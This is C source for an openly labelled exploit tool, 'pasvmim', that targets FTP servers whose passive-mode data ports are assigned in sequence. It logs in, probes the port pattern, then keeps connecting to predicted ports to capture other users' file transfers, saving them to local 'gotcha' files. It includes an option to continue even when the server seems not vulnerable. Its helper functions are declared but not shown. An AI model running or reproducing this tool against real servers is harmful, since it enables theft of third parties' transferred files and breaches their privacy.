#include <stdio.h>
#include <getopt.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <signal.h>
#include <sys/wait.h>

int log_ftp(char *hostname, int port, char *user, char *password);
int ftp_pasv(int fd);
int create_socket(int portnum);

#define WAIT 200
#define MAX_COUNT 50		/* 5 seconds will make it */
int waittime = WAIT;
int max_count = MAX_COUNT;
int verbose = 1;
char *hostname = "localhost";
int port = 21;
int serverfd;
char *user = "ftp";
char *pass = "own3d";
int ignore = 0;
void usage()
{
    printf("./pasvmim -h hostname -p port -u user:password [-c]\n"
	   "use 'xxx' as password for more security\n"
	   "-c to 'continue anymore'\n" "-w waittime -m max_count\n");
    exit(0);
}

int opts(int argc, char **argv)
{
    int i;
    char *p;
    while ((i = getopt(argc, argv, "h:p:u:w:m:c")) != -1) {
	switch (i) {
	case 'h':
	    hostname = strdup(optarg);
	    break;
	case 'p':
	    port = atoi(optarg);
	    break;
	case 'w':
	    waittime = atoi(optarg);
	    break;
	case 'm':
	    max_count = atoi(optarg);
	    break;
	case 'u':
	    p = strchr(optarg, ':');
	    if (!p)
		usage();
	    *p = 0;
	    p++;
	    user = strdup(optarg);
	    if (!strcmp(p, "xxx"))
		pass = getpass("Password:");
	    else
		pass = strdup(p);
	    break;
	case 'c':
	    ignore = 1;
	    break;

	default:
	    usage();
	}
    }
    return 0;
}

int total = 0;
void it_is_late(int nr)
{
    if (total == 0) {
	printf("**** Timeout\n");
	exit(0);
    }
}
int manage_socket(int sock, int num)
{
    int pid;
    char buffer[4096];
    char file[20];
    int filefd;
    int n;
    pid = fork();
    if (pid) {			/* father */
	return 0;
    }
    signal(SIGALRM, it_is_late);
    signal(SIGHUP, NULL);
    alarm(5);
    sprintf(file, "gotcha_%.3d", num);
    filefd = open(file, O_WRONLY | O_CREAT);
    if (filefd < 0) {
	perror(file);
	exit(0);
    }
    fchmod(filefd, 0666);
    while ((n = read(sock, buffer, 4096)) > 0) {
	write(filefd, buffer, n);
	total += n;
    }
    close(filefd);
    close(sock);
    if (total == 0) {
	unlink(file);
	printf("*** file %s destroyed (%d bytes) ***\n", file, total);
    } else
	printf("*** file %s saved (%d bytes) ***\n", file, total);
    exit(0);
}

void chld_hdlr(int null)
{
    signal(SIGCHLD, chld_hdlr);
    wait(NULL);
}
int main(int argc, char **argv)
{
    int ports[3];
    int guessedport;
    int i = 0;
    int counter;
    int fd;
    int gotfile = 0;
    if (argc < 2)
	usage();
    signal(SIGCHLD, chld_hdlr);
    printf("************PASSIVE MODE MIM************\n");
    opts(argc, argv);
    serverfd = log_ftp(hostname, port, user, pass);
    if (serverfd <= 0) {
	printf("*** Bye bye\n");
	exit(0);
    }
    for (i = 0; i < 3; i++) {
	ports[i] = ftp_pasv(serverfd);
	printf("*** Port %d opened on server\n", ports[i]);
    }
    if (ports[0] + 2 == ports[2])
	printf
	    ("*** the ports are choosed in a linear manner... continuing exploit\n");
    else {
	printf
	    ("Exploit didn't discover linearely choosed ports... the server may not be vulnerable\n");
	if (!ignore)
	    return 0;
    }
    guessedport = ports[2] + 1;
    while (1) {
	for (counter = 0; counter < max_count; counter++) {
	    fd = create_socket(guessedport);
	    if (fd > 1) {
		printf("*** Got something on port %d (%dth file) ***\n",
		       guessedport, ++gotfile);
		manage_socket(fd, gotfile);
		close(fd);
		break;
	    }
	    usleep(waittime);
	}
	guessedport = ftp_pasv(serverfd) + 1;
	printf("** Retrying using port %d\n", guessedport);
    }

    return 0;
}
